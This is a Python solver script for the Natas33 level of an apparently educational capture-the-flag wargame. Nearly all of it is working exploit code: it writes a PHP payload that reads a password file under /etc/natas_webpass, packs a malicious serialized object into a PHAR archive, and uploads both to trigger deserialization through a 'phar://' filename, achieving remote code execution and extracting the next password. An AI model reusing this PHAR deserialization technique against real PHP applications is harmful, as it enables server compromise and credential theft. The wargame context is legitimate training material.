import os
from pathlib import Path
import hashlib
from .base_solver import NatasSolver
from utils.php_template import PHPTemplateHandler
from utils.init_dirs import ensure_directories
import re
class Natas33Solver(NatasSolver):
    def solve(self) -> str:
        try:
            print("[*] Starting Natas33 solver...")
            
            # Ensure directories exist and get absolute paths
            ensure_directories()
            base_path = Path(os.getcwd())
            payloads_dir = base_path / 'payloads'
            
            # Create PHP payload for reading password
            print("[*] Creating PHP payload...")
            payload = b'<?php echo file_get_contents("/etc/natas_webpass/natas34"); ?>'
            hash_value = hashlib.md5(payload).hexdigest()
            print(f"[+] Payload MD5: {hash_value}")
            
            # Verify template exists
            template_path = payloads_dir / 'natas33.php.template'
            if not os.path.exists(template_path):
                print(f"[*] Creating template file: {template_path}")
                with open(template_path, 'w') as f:
                    f.write('''<?php

class Executor
{
  private $filename='{filename}';
  private $signature='{signature}';
}

$phar = new Phar(__DIR__ . '/natas33.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$object = new Executor();
$phar->setMetadata($object);
$phar->addFromString('test.txt', 'text');
$phar->stopBuffering();
?>''')
            
            # Create PHP file from template
            template_handler = PHPTemplateHandler()
            rendered = template_handler.render_template(
                'natas33.php.template',
                {
                    'filename': 'rce.php',
                    'signature': hash_value
                }
            )
            
            # Write temporary PHP file
            php_path = payloads_dir / 'temp_natas33.php'
            print(f"[*] Writing PHP file to: {php_path}")
            with open(php_path, 'w') as f:
                f.write(rendered)
            
            # Generate PHAR archive
            print("[*] Creating PHAR archive...")
            phar_path = payloads_dir / 'natas33.phar'
            print(f"[*] Expected PHAR path: {phar_path}")
            
            result = os.system(f'cd {payloads_dir} && php -d phar.readonly=false {php_path}')
            if result != 0:
                raise ValueError(f"PHAR creation failed with code {result}")
            
            if not os.path.exists(phar_path):
                raise ValueError(f"PHAR file not created at {phar_path}")
            
            # First upload RCE file
            print("[*] Uploading RCE file...")
            response = self.make_request(
                method="POST",
                data={"filename": "rce.php", "submit": "Upload File"},
                files={"uploadedfile": payload}
            )
            
            # Then upload PHAR file
            print("[*] Uploading PHAR file...")
            with open(phar_path, 'rb') as f:
                response = self.make_request(
                    method="POST",
                    data={"filename": "phar://natas33.phar/test.txt", "submit": "Upload File"},
                    files={"uploadedfile": f}
                )
            password = re.findall(r'getflag.php <br>(.*)', response.text)[0].strip()
            print(f"[+] Extracted password: {password}")
            # Clean up files
            print("[*] Cleaning up temporary files...")
            if os.path.exists(php_path):
                os.remove(php_path)
            return password.strip()

            raise ValueError("Could not find password in response")
            
        except Exception as e:
            raise RuntimeError(f"Failed to solve natas33: {str(e)}")